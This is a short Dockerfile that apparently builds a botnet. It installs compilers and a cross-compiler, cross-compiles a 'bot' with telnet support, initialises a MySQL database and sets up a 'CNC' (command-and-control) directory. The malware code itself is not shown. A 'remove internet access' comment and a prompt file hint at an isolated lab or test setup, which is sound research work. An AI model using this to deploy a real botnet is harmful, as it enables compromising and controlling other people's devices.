# This is the main docker image, compiling all the sources

# TODO: remove internet access

FROM ubuntu:jammy

RUN apt update

RUN apt upgrade -y

# Install dependencies
RUN apt install git wget gcc golang electric-fence mysql-client screen dialog python3 apache2 gcc-sh4-linux-gnu iputils-ping dnsutils telnet -y

# Copy files
COPY . /home/
WORKDIR /home/

# Crosscompile bot
RUN bash ./tools/compilers.sh
RUN cat prompt.txt
RUN bash ./setup.sh
RUN chmod +x build.sh
RUN ./build.sh debug telnet

# Mysql server install and init
RUN apt-get update && \
    apt-get -y install mysql-server && \
    service mysql start && \
		cat ./tools/db.sql | mysql
RUN service mysql restart

# Run CNC
WORKDIR /home/debug/